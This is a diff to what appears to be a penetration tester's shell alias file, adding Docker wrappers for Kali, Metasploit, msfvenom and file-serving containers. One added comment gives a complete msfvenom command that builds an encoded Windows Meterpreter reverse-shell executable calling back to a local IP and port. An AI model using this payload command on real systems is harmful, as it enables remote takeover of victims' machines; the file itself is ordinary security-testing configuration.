@@ -9,7 +9,8 @@ alias config-push='dotfile-update-to-git'
 
 #### Docker -> https://blog.ropnop.com/docker-for-pentesters/ && https://medium.com/@nima.saed/metasploit-framework-console-on-docker-with-workspace-fc39f0f2a078
 alias kali='docker run -it -v "${HOME}/kali:/root/" kalilinux/kali-linux-docker /bin/bash'
-alias msfvenomhere='docker run --rm -it -v "${HOME}/.msf4:/home/msf/.msf4" -v "${PWD}:/data" -p 5432:5432 metasploitframework/metasploit-framework ./msfvenom'
+#example: msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.238 LPORT=8443 -b "\x00" -i 5 -e x86/shikata_ga_nai -f exe -o /home/msf/.msf4/tryme.exe
+alias msfvenom='docker run --rm -it -v "${HOME}/.msf4:/home/msf/.msf4" -v "${PWD}:/data" -p 5432:5432 metasploitframework/metasploit-framework ./msfvenom'
 alias metasploit='msf-docker'  
 alias webdavhere='docker run --rm -it -p 80:80 -v "${PWD}:/srv/data/share" rflathers/webdav'
 alias nginxhere='docker run --rm -it -p 80:80 -p 443:443 -v "${PWD}:/srv/data" rflathers/nginxserve'
